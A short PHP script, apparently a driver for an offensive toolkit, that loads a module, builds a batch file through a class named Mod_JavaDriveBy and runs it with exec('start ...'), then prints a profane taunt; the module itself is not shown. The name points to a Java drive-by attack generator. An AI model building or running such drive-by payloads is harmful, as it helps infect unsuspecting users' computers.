<?php
	set_time_limit(300);
	// Include module. Here we need the generator module
	include("../module/module.php");
	
	$createJDB = new Mod_JavaDriveBy();
	$batchFile = $createJDB->createBat();
	var_dump($batchFile);
	// system ("cmd /c ".$batchFile);
	
	exec('start '.$batchFile);
	print "Yipikayer motherfucker";
	
	// All objects as here
?>